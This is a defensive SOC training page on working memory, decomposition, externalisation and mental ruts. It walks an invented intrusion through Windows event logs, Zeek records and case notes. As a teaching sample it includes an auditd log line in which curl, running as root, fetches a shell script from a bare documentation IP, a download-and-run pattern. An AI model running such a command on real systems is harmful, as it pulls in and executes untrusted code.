---
title: "Memory and Experience — Working Memory Limits, Decomposition and Externalisation, Assimilation, and Mental Ruts"
tags:
  - training
  - blue-team
  - soc
  - analysis
  - cognition
---

# Memory and Experience — Working Memory Limits, Decomposition and Externalisation, Assimilation, and Mental Ruts { #memory-experience }

!!! abstract "What this page covers"
    The previous page showed that perception is a filter. This page looks at what that filter is made of: **memory**. Your mental models live in long-term memory, and every investigation is worked in short-term memory, so the way memory works directly shapes the quality of your analysis. We cover the **three stages of memory** in Heuer's model (sensory store, short-term memory, long-term memory), the famous **"7 ± 2" limit** of short-term (working) memory and what newer research says about it, and why a real investigation — hosts, users, IPs, processes and the relationships between them — blows past that limit within minutes. The fix is **decomposition** (break the problem into parts you can understand one at a time) and **externalisation** (get it out of your head into notes, tables, timelines and diagrams), and we do both on a worked case with a full set of case notes, reading the log lines field by field (**7045**, **4624**, **4672**, **4688**, Zeek `conn` and `dns`). Then the fastest way into long-term memory — **assimilation**, tying new information to something you already know — with a concrete example of learning a new log source by mapping it to one you know. Finally, the **two sides of experience**: speed and pattern recognition versus **mental ruts**, the extra effort of unlearning, and the habit of never going back to evidence you set aside earlier. The 2026 view (AI copilots as external memory, ATT&CK's own model changing under you) and practice questions close the section.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. The company (Kestrel Logistics), hostnames, accounts, domains, IPs and log lines are invented for illustration (`.example`, documentation and private IPs). Psychology findings are described in my own words.

## The 8 key points { #key-points }

1. **Memory is the raw material of perception.** Your mental models come from experience stored in long-term memory, so whatever affects memory affects the result of your analysis.
2. **Three stages:** a sensory store that holds raw input for a fraction of a second, **short-term (working) memory** that interprets it and holds only a handful of items, and **long-term memory** with practically no storage limit — where *storing well* and *finding again* are the hard parts.
3. **Working memory is tiny.** The classic figure is about **7 ± 2 items**; newer research puts the true limit closer to **about 4 chunks**. Either way, information only stays there while you keep rehearsing it.
4. **Investigations are far bigger than that.** Ten entities already have 45 possible pairwise relationships; twenty have 190. Trying to hold an investigation "in your head" is guaranteed to fail.
5. **Decomposition** breaks the problem into parts you can understand separately (inputs, outputs, what happens inside), then reassembles them. **Externalisation** writes entities, events and relationships down so you can see them all at once without using working memory.
6. **Modelling the problem helps you learn it.** A structure (table, timeline, tree, mind map, matrix) gives new information categories and connections, which makes recall easier and, with repeated use, moves the model into long-term memory.
7. **Assimilation is the shortcut into long-term memory:** connect new information to a concept you already understand. Analogies and models work because of this; mnemonics are a weaker, artificial version.
8. **Experience cuts both ways.** Strengthened pathways make experts fast and accurate on familiar problems — and form **mental ruts** that make it hard to see alternatives, harder to be creative and expensive to unlearn. In security the rules change constantly, so the experienced have the most to unlearn. The defence is many accurate mental models plus awareness of these failure modes.

## Why this matters in a SOC { #why }

Picture a desk that can hold only four sheets of paper. Every time you put a fifth on it, one falls off the edge — and you don't always notice which. That's working memory. An analyst who works a case with no notes is shuffling sheets on that desk: the IP from twenty minutes ago, the second username, the odd DNS query they decided didn't matter. Something falls off, and it's usually the thing that would have connected everything.

The technical reality behind the analogy: an intrusion of any size involves dozens of hosts, accounts, addresses, processes and files, and what matters is the **relationships** between them (this account logged on to that host from that address, which then started this process). Missing a relationship isn't a small error — it's how lateral movement goes unseen and how containment leaves one compromised machine behind. The two habits on this page, decomposition and externalisation, are the cheapest quality control a SOC has. They also make hand-overs possible: case 1 on the [previous page](perception.md#case-scanner) was saved because a colleague could read the whole case at once.

There's a second reason. Long-term memory is where your mental models live, and what is stored there — and how — decides how fast and how accurately you recognise the next attack. Knowing how memory gets built tells you how to learn this field quickly, and knowing how it fails tells you when your experience is most likely to mislead you.

## Types of memory { #types-of-memory }

Heuer describes memory as a sequence of stages (based on the cognitive psychology of his time, which is still a useful model):

| Stage | What it does | Capacity | How long it lasts |
| --- | --- | --- | --- |
| **Sensory information store** | Holds a raw "image" of what your senses just picked up | Large, but unprocessed | A fraction of a second to a few seconds, then gone |
| **Short-term memory** (working memory) | Interprets what came in, picks out what matters, and is where you actually *think* | Very small — a handful of items | Seconds, unless you keep repeating it |
| **Long-term memory** | Stores what has been encoded for later use: facts, experiences, schemas, mental models | No practical limit | Potentially a lifetime |

A few points that matter for analysts:

- **Short-term memory has to be refreshed.** The only way to keep something there is to keep rehearsing it ("10.20.4.12, 10.20.4.12…"). The moment your attention goes to a new query result, the old item starts to fade. Some of what you rehearse gets passed on to long-term memory; most doesn't.
- **Long-term memory isn't a filing cabinet that's running out of space.** Its capacity isn't the problem. The problems are **encoding** (did the information get stored, and connected to anything?) and **retrieval** (can you find it when you need it, using the cue you happen to have?). You've had the experience of knowing you've seen an indicator before but not being able to recall where — that's a retrieval failure, not a storage one.
- **Long-term memory is organised as a network of connected ideas** — schemas. A memory you can reach from many different cues (a port number, a tool name, a process tree shape, a past incident) is easy to retrieve. A memory with one weak connection is effectively lost.

For our purposes the two things to remember are the **limits of short-term memory** and the **organisation of long-term memory**. The rest of this page is about working with the first and exploiting the second.

## Short-term memory and analysis { #short-term-memory }

### The 7 ± 2 limit — and the newer estimate { #seven-plus-minus-two }

The figure everyone quotes comes from a 1956 paper by the psychologist George Miller: people can hold roughly **seven items, plus or minus two**, in short-term memory. Heuer uses this figure, and it's good enough to make the point.

**[Correction]** Later research (notably Nelson Cowan's 2001 review) argues that once you stop people from rehearsing and grouping, the real capacity is closer to **about four "chunks"**. Miller's seven was partly inflated by chunking. The direction of the lesson doesn't change — it gets stronger: working memory is *even smaller* than the classic figure suggests.

**Chunking** is the important idea hidden inside that correction. A chunk is a group of items that your long-term memory already knows as one unit. To a beginner, these are five separate things to hold:

```
4624   Logon Type 3   4672   adm_j.marsh   KL-APP03
```

To an experienced analyst they are **one** chunk: *"an admin account made a privileged network logon to the app server"*. That's why experts seem to hold much more in their heads — not because their working memory is bigger, but because their long-term memory packages information into bigger chunks. It's also a hint about how to learn: the more patterns you know well, the more each slot in working memory can carry.

### Why investigations overflow working memory { #overflow }

Even a small case contains more than seven things. But the bigger problem is that analysis is about **relationships**, and relationships grow much faster than items. If you have *n* entities, the number of possible pairs between them is *n × (n − 1) ÷ 2*:

| Entities in the case | Possible pairwise relationships |
| --- | --- |
| 5 | 10 |
| 7 | 21 |
| 10 | 45 |
| 15 | 105 |
| 20 | 190 |

And that's only pairs — "this user, on this host, at this time, from this address" is a relationship between four things at once. By the time you've run three or four queries, you're past what any human can keep straight mentally. The answer isn't to try harder. It's to stop using working memory as storage at all.

## The solution: decomposition and externalisation { #decomposition-externalisation }

Heuer's answer has two parts that work together.

**Decomposition** means breaking the problem into smaller parts that you can understand one at a time, then putting them back together to see the whole. It's similar to **systems thinking**: you take one piece, treat it as a box with inputs, outputs and something happening inside, understand it on its own, and then reconnect it to the larger system. "Is this host compromised?" is too big to think about directly. "How did this file get here?", "What did it do once it ran?", "Which account was used, and from where?" and "Did anything leave the network?" are each small enough to answer.

**Externalisation** means getting the problem **out of your head** and onto paper, a screen, a whiteboard — anything that lets you see all the pieces at once *and* draw the relationships between them. Decomposition alone still leaves you with more pieces than you can hold; externalisation is what lets you keep them all in view.

An analogy: a jigsaw puzzle. Decomposition is sorting the pieces — edges here, sky there, the red barn in a third pile — and finishing each area separately. Externalisation is spreading the pieces face up on the table instead of keeping them in the box and pulling them out one at a time. Nobody would try to do a thousand-piece puzzle from inside the box. Yet that's what an unwritten investigation is.

### What externalising looks like in practice { #externalisation-formats }

There is no single correct format. Use the one that fits the question you're answering:

| Format | Good for | SOC example |
| --- | --- | --- |
| **Entity list / table** | Keeping every host, account, IP, domain, file and hash in one place with a short note | "203.0.113.77 — external, resolved from `update-cdn.example`, seen from KL-APP03 and KL-WS-0412" |
| **Timeline** | Order of events, gaps, cause and effect | One row per event, in UTC, with source and host |
| **Relationship list / graph** | Who connected to what, which account was used where | `adm_j.marsh` → logon type 3 → KL-APP03 |
| **Tree / mind map** | Decomposing a big question into sub-questions | "Compromised?" → delivery / execution / persistence / spread / exfiltration |
| **Matrix** | Comparing hypotheses against evidence, or hosts against indicators | Later sections use matrices for structured analysis |
| **Hypothesis log** | Writing theories down with time and confidence, plus alternatives | "14:20 — working theory: admin installed tool; alternative: attacker with stolen admin creds" |

**[Supplement]** The best place for these is your **case management system or ticket**, not a private notebook: it keeps the record with the case, lets a colleague take over at any point, and becomes the evidence trail for later review. Use a scratch file or whiteboard for thinking, then move the result into the case.

## Worked case: one alert, twenty entities { #worked-case }

Here's a realistic case worked twice — once in the head, once on paper.

**14:02 — the alert.**

```
[EDR] New service installed with binary in temp directory   severity: high
  host=KL-APP03   service=SvcHelper   path=C:\Windows\Temp\svchelper.exe   user=SYSTEM
```

The analyst, Priya, pulls the System log entry behind it:

```
Event ID 7045  Log: System  Computer: KL-APP03  2026-11-24T13:58:12Z
  A service was installed in the system.
  Service Name:      SvcHelper
  Service File Name: C:\Windows\Temp\svchelper.exe
  Service Type:      user mode service
  Service Start Type: auto start
  Service Account:   LocalSystem
```

- **7045** ("A service was installed in the system") is written to the **System** log by the Service Control Manager whenever a new service is registered. It fires on the host where the service was created. Attackers care because a service is an easy way to run code **as SYSTEM** and to make it **start again after reboot** — both execution (**T1569.002 System Services: Service Execution**) and persistence (**T1543.003 Create or Modify System Process: Windows Service**). Remote execution tools like PsExec create a service on the target too ([services and tasks](../important-events/services-tasks-usb.md)).
- `Service File Name` — a binary in `C:\Windows\Temp` is a red flag: legitimate services live in `Program Files` or `System32`, not in a temp folder anyone can write to.
- `Service Start Type: auto start` — it will run at every boot: persistence.
- `Service Account: LocalSystem` — the highest privilege on the machine.

**14:09 — who did it?** Security log on KL-APP03, a few seconds before the 7045:

```
Event ID 4624  Computer: KL-APP03  2026-11-24T13:57:58Z
  Account Name: adm_j.marsh   Logon Type: 3   Logon ID: 0x3E7A21
  Source Network Address: 10.20.4.12   Authentication Package: Kerberos
Event ID 4672  Computer: KL-APP03  2026-11-24T13:57:58Z
  Account Name: adm_j.marsh   Logon ID: 0x3E7A21
  Privileges: SeDebugPrivilege, SeBackupPrivilege, SeTakeOwnershipPrivilege, ...
```

- **4624** (successful logon) with **Logon Type 3** — a network logon (for example, connecting to the service manager or an admin share remotely). It fires on the target. Attackers produce it every time they use stolen credentials against another machine ([logins](../important-events/logins.md)).
- **4672** ("Special privileges assigned to new logon") fires right after 4624 when the account has admin-level privileges. The matching `Logon ID` (`0x3E7A21`) ties the two events into one session. Attackers care because it means the session can do anything — install services, dump memory (`SeDebugPrivilege`).
- `Source Network Address: 10.20.4.12` — the logon came from another internal machine. Asset inventory says that's **KL-WS-0412**, a workstation belonging to `j.marsh`.

So `adm_j.marsh` — the admin account of a real IT admin — logged on from his own workstation and installed a service. **Working theory: Jordan Marsh deploying a tool.** Plausible; admins do this.

**14:18 — what did the service do?**

```
Event ID 4688  Computer: KL-APP03  2026-11-24T13:58:13Z
  Creator Process Name: C:\Windows\System32\services.exe
  New Process Name:     C:\Windows\Temp\svchelper.exe
  Process Command Line: C:\Windows\Temp\svchelper.exe -k netsvcs
```

- **4688** ("A new process has been created") — the service's binary started as a child of `services.exe`, exactly as a service should. The `-k netsvcs` argument imitates the way real Windows services are started by `svchost.exe`, but this isn't `svchost.exe` — a small piece of **masquerading** (**T1036.004 Masquerading: Masquerade Task or Service**) ([process creation](../important-events/process-creation.md)).

**14:25 — network.** Zeek logs from the server segment:

```
#fields ts  uid  id.orig_h  id.orig_p  id.resp_h  id.resp_p  proto  service  duration  orig_bytes  resp_bytes  conn_state
1795528692.4  CaX1  10.20.6.33  50122  203.0.113.77  443  tcp  ssl  1598.2  1830442  95120  SF
```

- `id.orig_h=10.20.6.33` — KL-APP03; `id.resp_h=203.0.113.77`, port `443` — an external address over TLS.
- `duration=1598.2` — about **27 minutes** in one connection (Zeek writes the line when the connection ends — this one closed at 14:24). Web browsing rarely holds one TLS session that long; a beacon or interactive channel does.
- `orig_bytes=1830442` vs `resp_bytes=95120` — the server **sent** about 1.8 MB and received about 95 KB. For a "client" that's backwards — more out than in — which hints at data leaving or interactive control.

```
#fields ts  uid  id.orig_h  query  qtype_name  answers
1795528691.9  Dn7Q  10.20.6.33  update-cdn.example  A  203.0.113.77
```

- The DNS lookup just before: KL-APP03 resolved `update-cdn.example` to `203.0.113.77`. A generic "update/CDN" name is a common disguise for command and control (**T1071.001 Application Layer Protocol: Web Protocols**).

**14:31 — more.** Priya checks KL-WS-0412 and finds that `j.marsh` connected over the VPN at 03:12 UTC from an address that isn't his usual home IP, and that his session on KL-WS-0412 has been active since. She vaguely recalls that someone said Jordan was on leave this week. And she remembers that at 14:05, while scrolling KL-WS-0412's DNS, she saw a TXT lookup to `cfg.update-cdn.example` and **dismissed it as antivirus telemetry**.

By now there are around twenty entities in play. Count them: four hosts (KL-APP03, KL-WS-0412, KL-DC01 which issued the Kerberos tickets, the VPN gateway), three accounts (`j.marsh`, `adm_j.marsh`, the VPN identity), five addresses (10.20.6.33, 10.20.4.12, 203.0.113.77, a VPN pool address, the user's home IP), two domains, two processes, a file and its hash, a service name, and half a dozen timestamps. That's 190 possible pairs. Held in the head, the case goes like this: Priya is still anchored on "admin deploying a tool"; the TXT lookup she dismissed at 14:05 is gone from working memory; she doesn't notice that it went to **the same parent domain** as the C2 connection; and the 03:12 VPN login is a fact she half-remembers but never compares with the leave calendar.

### The same case, externalised { #case-notes }

Now the version on paper. Priya opens the case notes and writes as she goes:

```
CASE KL-2026-1124-07   Owner: Priya   Opened 14:02Z

QUESTION
  Is KL-APP03 compromised? If yes: how, by whom, what else, is data leaving?

SUB-QUESTIONS (decomposition)
  Q1 Delivery:      how did svchelper.exe get onto KL-APP03?
  Q2 Execution:     what started it, under which account?            -> 7045, 4688
  Q3 Access:        where did that account come from?                -> 4624/4672 from 10.20.4.12
  Q4 Origin:        is KL-WS-0412 / j.marsh itself compromised?
  Q5 C2/exfil:      what is KL-APP03 talking to outside?             -> 203.0.113.77:443, 27 min, 1.8 MB out
  Q6 Scope:         who else talks to update-cdn.example / 203.0.113.77?

ENTITIES
  host    KL-APP03     10.20.6.33   app server; service SvcHelper installed 13:58Z
  host    KL-WS-0412   10.20.4.12   workstation of j.marsh; source of admin logon
  host    KL-DC01      10.20.1.5    issued Kerberos tickets for adm_j.marsh
  acct    adm_j.marsh               privileged; 4624 type 3 + 4672 on KL-APP03
  acct    j.marsh                   VPN login 03:12Z — user on leave (HR calendar)
  ip      203.0.113.77              external; C2 candidate
  domain  update-cdn.example        A -> 203.0.113.77
  domain  cfg.update-cdn.example    TXT lookup from KL-WS-0412 at 13:41Z  (first dismissed — REOPENED)
  file    C:\Windows\Temp\svchelper.exe   sha256: <pending>

TIMELINE (UTC)
  03:12  VPN login j.marsh from 192.0.2.88 (not his usual home IP)
  13:41  KL-WS-0412  DNS TXT cfg.update-cdn.example
  13:57  KL-APP03    4624 type 3 + 4672  adm_j.marsh from 10.20.4.12
  13:58  KL-APP03    7045 SvcHelper (C:\Windows\Temp\svchelper.exe, auto, LocalSystem)
  13:58  KL-APP03    4688 services.exe -> svchelper.exe -k netsvcs
  13:58  KL-APP03    DNS A update-cdn.example -> 203.0.113.77
  13:58  KL-APP03    TLS to 203.0.113.77:443, 27 min, 1.8 MB out

HYPOTHESES
  H1 14:09  Admin Jordan installed a legitimate tool             (weakening)
  H2 14:09  Attacker using j.marsh's session/creds from KL-WS-0412 (strengthening)
     Would distinguish: change ticket? Jordan on leave? tool known? TXT domain related?

PARKED / DISMISSED (re-check when new facts arrive)
  13:41 TXT lookup from KL-WS-0412 — dismissed 14:05 as AV telemetry; same parent domain as C2 -> RELEVANT

OPEN ACTIONS
  - Ask Jordan / change calendar (14:33)
  - Hash svchelper.exe, check EDR prevalence
  - Search proxy/DNS for update-cdn.example across all hosts (Q6)
```

Look at what writing it down did:

- The **parked list** made the dismissed TXT lookup visible again. When `update-cdn.example` turned up on the server, the match with `cfg.update-cdn.example` was on the same screen. Without it, that connection lives only in working memory, which had already dropped it.
- The **timeline** put the 03:12 VPN login, the 13:41 TXT lookup and the 13:57 admin logon in one column. The story — attacker logs in via VPN overnight, hands-on-keyboard on Jordan's workstation in the afternoon, beacons out, then uses the admin account to move to the server — is visible as a sequence rather than something you have to reconstruct.
- The **hypothesis log** with "would distinguish" turned a feeling into a checklist. One phone call settles it: Jordan is on leave and made no change. H1 drops, H2 becomes the working conclusion, and the case is escalated as a likely compromise of `j.marsh` (**T1133 External Remote Services**, **T1078 Valid Accounts**, **T1021.002 Remote Services: SMB/Windows Admin Shares**, **T1543.003**, **T1071.001**).
- The **sub-questions** told her what was still unanswered (Q1 delivery, Q6 scope) when the pressure was to close as soon as the main question felt answered.

This is also why externalising **helps you learn**. After a few cases written in this shape, the shape itself — delivery, execution, access, origin, C2, scope — becomes a schema in long-term memory, and the next case starts already decomposed.

## The benefits: structure makes recall easier { #benefits }

Decomposition and externalisation do more than stop you dropping facts. They sort the problem and the actors into **categories and simple structures**, and structured information is much easier to recall. The model you've built acts as an artificial frame for the problem — something new information can attach to.

It takes time, but with repeated use the model itself moves into long-term memory and links up with what you already know. At that point you truly understand the problem, and you work on it much faster. That's why so many people reach for **mind maps, relationship diagrams, trees, lists, tables and matrices** when solving problems: they give the brain a structure it can connect to existing concepts.

A simple text mind map for the same case, the kind you might sketch on a whiteboard:

```
KL-APP03 compromised?
├── Delivery ........ svchelper.exe in C:\Windows\Temp  (how? SMB copy from KL-WS-0412?)
├── Execution ....... 7045 SvcHelper -> 4688 services.exe -> svchelper.exe
├── Access .......... adm_j.marsh, 4624 type 3 + 4672, from 10.20.4.12
│   └── Origin ...... KL-WS-0412 / j.marsh — VPN 03:12 while on leave
├── C2 / exfil ...... update-cdn.example -> 203.0.113.77:443, 27 min, 1.8 MB out
│   └── related ..... cfg.update-cdn.example TXT from KL-WS-0412
└── Scope ........... other hosts resolving update-cdn.example?  (open)
```

## The shortcut into long-term memory: assimilation { #assimilation }

The most efficient way to move something from short-term to long-term memory is **assimilation**: take the new information, relate it to a concept you already know well, and store it alongside that concept. The new item doesn't need its own new set of connections — it borrows the existing ones.

Try it. Remember these eight items for a minute:

```
List A:  stapler, onion, tennis ball, tofu, umbrella, chilli paste, battery, pork belly
List B:  kimchi, pork belly, tofu, onion, spring onion, chilli paste, garlic, anchovy stock
```

List B is almost effortless if you know Korean cooking: it's **kimchi stew (김치찌개)**. You don't store eight items — you store "kimchi stew ingredients" and the items hang off a schema you already have. List A has no shared category, so every item needs its own artificial link. (A **mnemonic** — say, a silly sentence using the first letters — is that artificial link. It works, but it's slower to build and more fragile than real assimilation.)

This is why **analogies and models** speed up learning so much, and why this handbook uses them constantly: each one gives the new idea an existing place to live.

### Assimilation applied: learning a new log source { #assimilation-logs }

**[Supplement]** The same trick is the fastest way to get productive with an unfamiliar tool or log type. Don't learn it from scratch — **map it to what you know**. Suppose you know Windows 4688 well and are given Linux `auditd` process logs for the first time:

```
type=SYSCALL msg=audit(1795531120.551:8812): arch=c000003e syscall=59 success=yes exit=0 ppid=2210 pid=2245 auid=1001 uid=0 euid=0 comm="curl" exe="/usr/bin/curl" key="exec"
type=EXECVE msg=audit(1795531120.551:8812): argc=3 a0="curl" a1="-s" a2="http://198.51.100.9/x.sh"
```

| What you already know (4688) | `auditd` equivalent | Note |
| --- | --- | --- |
| "A new process has been created" | `syscall=59` (`execve` on x86-64) | The system call that starts a program |
| `New Process Name` | `exe="/usr/bin/curl"` | Full path of the binary |
| `Process Command Line` | `EXECVE` record: `a0`, `a1`, `a2`… | Each argument is a separate field |
| `Creator Process ID` | `ppid=2210` | Parent process |
| `Subject Account` / `Logon ID` | `auid=1001` (the original login user), `uid`/`euid` | `auid` survives `sudo`, so it tells you who really ran it |
| Token elevation | `euid=0` | Effective user is root |

Read through that lens, the two lines say: *the user who originally logged in as UID 1001 is running `curl` as root and fetching a shell script from a bare IP* — a download-and-run pattern (**T1105 Ingress Tool Transfer**, likely followed by **T1059.004 Command and Scripting Interpreter: Unix Shell**). You understood a new log format in a minute because every field attached to something you already knew. The same approach works for Zeek against firewall logs, Sysmon against Security events, or a cloud audit log against Windows logon events ([Linux logging](../linux-logging/index.md)).

## The pros and cons of experience { #experience }

Why spend a page on memory in a field this technical? Because your memories and the mental models built from them are part of the filter through which every piece of incident data is perceived. Even **how familiar** you are with a concept changes which hypotheses you come up with.

Every time you see and analyse a similar problem, the mental pathways for it get **stronger**. That's the good part:

- **Speed** — accurate, intuitive judgements become faster and easier. The experienced analyst glances at a process tree and knows.
- **Pattern recognition** — strong pathways make it easier to spot the malicious shape inside a complex situation. This is, quite literally, the difference between a new analyst and a seasoned one.

But speed and efficiency have a price:

- **Strong pathways become mental ruts.** A pathway used often enough becomes the default answer, used even when it's wrong, and it becomes hard to see the situation any other way. The image is a rut in a dirt road: once the groove is deep, the wheels fall into it, and steering out takes real effort.
- **Changing perspective gets harder.** You don't just prefer the usual explanation; alternatives stop occurring to you.
- **Creativity gets harder.** Novel attack paths need novel hypotheses, and ruts pull you back to familiar ones.
- **Unlearning takes more effort than learning.** Replacing a strong, well-connected schema is harder than building a new one from nothing.

### What mental ruts look like in a SOC { #ruts-examples }

Concrete examples of "knowledge" that was true once and now leads people astray:

| The rut | Why it was learned | Why it misleads now |
| --- | --- | --- |
| "Malicious Office documents = macros" | For years, macro documents were the main phishing payload | Since 2022, Office blocks macros in files from the internet by default; attackers moved to ISO/IMG and ZIP containers, LNK shortcuts, HTML smuggling (**T1027.006**) and links to cloud-hosted files |
| "Port 443 = someone browsing the web" | Historically true | Most C2 now uses TLS over 443, often to cloud or CDN services (**T1071.001**, **T1102**) |
| "MFA succeeded, so it's the real user" | MFA stopped password-only attacks | Push fatigue (**T1621**), adversary-in-the-middle phishing that steals session cookies (**T1557**, **T1539**) |
| "That alert on that server is always the backup job" | It was, 500 times | The 501st time is the one that matters ([previous page, case 2](perception.md#case-known-fp)) |
| "Defense Evasion is one ATT&CK tactic" | True from ATT&CK's start until 2026 | ATT&CK v19 (April 2026) split it into **Stealth** and **Defense Impairment**; your mappings, reports and dashboards need updating |

### Hardened mindsets and the rules that keep changing { #hardened-mindsets }

With time, experienced analysts' mindsets harden. The reasoning is understandable — *"my approach has worked so far, why change?"*, *"I understand how this works"* — and in many fields it's even correct: the laws of physics don't change, so an experienced engineer's intuition stays reliable.

Security isn't one of those fields. The "rules" change daily: new techniques, new tools, new infrastructure, new ways of abusing legitimate services. What you learned and the schemas you built may simply not apply to tomorrow's attack. A better hypothesis can require building **new** schemas, or **unlearning** old ones — the harder task. And the people with the most to unlearn are exactly the experienced ones.

There's one more trap, and the worked case above shows it. When new information turns up late in an investigation, people tend **not to go back and reassess earlier evidence** in its light. Once a fact has been judged "doesn't fit" and set aside, it rarely gets picked up again — even when the new information makes it relevant. Priya's dismissed TXT lookup is exactly that. It was only recovered because it was written on a list, not left in her head.

### The solution { #solution }

The answer isn't to distrust experience — it's the most valuable thing an analyst has. It's to have **many accurate mental models**, keep updating them, and stay **aware of the typical failures**:

- Build models on purpose and keep more than one for any situation (the next section covers the standard ones: kill chain, OODA, defence in depth, ATT&CK and others).
- **Decompose and externalise** every non-trivial case, so working memory is used for thinking, not storage.
- Keep a **parked/dismissed list** and re-read it whenever a new fact arrives or before closing.
- **Learn by assimilation** — tie every new technique or log type to something you already know — so your models grow quickly and stay connected.
- Schedule **unlearning**: when a framework, product or attacker habit changes, deliberately revisit what you "know" about it.

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid"
    The memory model, the tiny size of working memory, the value of decomposition and externalisation, assimilation as the fast route into long-term memory, and the double edge of experience are all still accepted and widely taught. Heuer's book remains freely available from the CIA's Center for the Study of Intelligence. Writing a structured case record (entities, timeline, hypotheses, open questions) is standard practice in mature SOCs and DFIR teams, and most case-management platforms are built around exactly these elements.

!!! info "[Changed] What has changed"
    - **The working-memory estimate shrank.** The classic "7 ± 2" is still quoted, but the more commonly cited modern estimate is about **4 chunks** — which only strengthens the case for externalising.
    - **AI copilots are becoming external memory.** SOC platforms now generate case summaries, timelines and entity lists automatically. That's genuine externalisation, and it helps — but it's someone else's decomposition. Early evidence also suggests heavy reliance can reduce your own engagement: a 2025 MIT Media Lab preprint (*Your Brain on ChatGPT*, Kosmyna et al., 54 participants, essay writing, not peer-reviewed at release) reported lower brain connectivity and poorer recall of their own work among people who wrote with an LLM. It's a small study in a different task, so treat it as a warning sign, not a settled result.
    - **Your models are moving underneath you, fast.** ATT&CK split Defense Evasion into Stealth and Defense Impairment in v19 (April 2026) and added AI-related techniques in v20 (October 2026). Attackers' speed raises the cost of a stale model: one 2026 industry report put average eCrime "breakout" (initial access to lateral movement) at **29 minutes**, with the fastest at **27 seconds**. Unlearning is now part of the job, not an occasional event.

!!! warning "[Caution] Wrong or risky to do the old way"
    - **Don't work cases "in your head" and write up at the end.** Write as you go; the end-of-case write-up is where dismissed evidence disappears for good.
    - **Don't let an AI-generated summary replace your own model.** Use it as a draft to check against the raw events — and build your own sub-questions and hypothesis list.
    - **Don't paste case data into AI tools your organisation hasn't approved.** Externalising into an unapproved public service is an OPSEC and data-handling failure (analysis OPSEC is covered in a later section).
    - **Don't delete dismissed evidence — park it.** Keep it visible in the case with the reason it was dismissed, so new facts can bring it back.
    - **Don't treat "I've seen this a hundred times" as evidence.** It's a reason to check the fields that distinguish the usual case from a lookalike.

## Practice questions { #quiz }

### Question 1

Explain the difference between short-term and long-term memory, and what the main limitation of each is for an analyst. Why does an expert *seem* to hold more in their head than a beginner?

??? success "Answer and explanation"
    **Short-term (working) memory** is where you interpret incoming information and actually think. Its limitation is **capacity** — classically about 7 ± 2 items, more recently estimated at about 4 chunks — and information fades unless you keep rehearsing it.

    **Long-term memory** stores encoded information, schemas and mental models with no practical capacity limit. Its limitations are **encoding** (was the information stored and connected to anything?) and **retrieval** (can you find it again from the cue you have?).

    Experts aren't working with a bigger working memory. Their long-term memory lets them **chunk**: "4624 type 3 + 4672 for `adm_j.marsh` on KL-APP03" is one chunk ("privileged network logon to the server") for an expert, but five separate items for a beginner. Each working-memory slot carries more.

### Question 2

A case has grown to 15 entities. How many possible pairwise relationships is that? Name the two techniques that compensate, explain what each does, and give one concrete artefact you'd produce for each.

??? success "Answer and explanation"
    15 × 14 ÷ 2 = **105** possible pairs — and many relationships involve more than two entities at once.

    - **Decomposition** — break the big question into smaller ones you can answer one at a time, then reassemble. Artefact: a list of sub-questions such as delivery / execution / access / origin / C2 / scope, or a mind-map tree.
    - **Externalisation** — move the problem out of your head so you can see every piece and relationship at once. Artefacts: an entity table, a UTC timeline, a relationship list or graph, a hypothesis log with "what would distinguish", and a parked/dismissed list.

    Both should live in the case record so another analyst can take over.

### Question 3

In the worked case, what was the "dismissed evidence" trap, why does it happen, and what habit prevented it? Then give one example of a mental rut from your own area of work and how you would deliberately unlearn it.

??? success "Answer and explanation"
    Priya dismissed a TXT lookup to `cfg.update-cdn.example` as antivirus telemetry. When `update-cdn.example` later appeared as the C2 domain, the earlier lookup became highly relevant — but people rarely go back and **re-evaluate evidence they've already judged "doesn't fit"**. It happens because the dismissed item drops out of working memory and the existing hypothesis gives no reason to look for it. The **parked/dismissed list** in the externalised case notes kept it visible, so the connection was obvious.

    Example of a rut (any well-argued one is fine): "malicious Office files are macro documents." Since 2022 macros from the internet are blocked by default and attackers use ISO/ZIP containers, LNK files, HTML smuggling (T1027.006) and cloud-hosted links. To unlearn it: review recent phishing cases and threat reports for current delivery methods, update the triage checklist and detection coverage to match, and look at a few real samples of the new formats so the new schema has concrete examples attached.

## Related { #related }

- [Perception and analysis](perception.md) — the filter that memory feeds
- [Services and scheduled tasks (7045)](../important-events/services-tasks-usb.md) · [Logins (4624/4672)](../important-events/logins.md) · [Process creation (4688)](../important-events/process-creation.md)
- [Linux logging](../linux-logging/index.md) — background for the `auditd` records in the assimilation example
- [Defining "dangerous"](../alert-triage/defining-dangerous.md) — the attack models that structure decomposition
- [PsExec and SMB](../../../adversary/psexec-smb.md) · [Phishing delivery](../../../adversary/phishing-delivery.md)
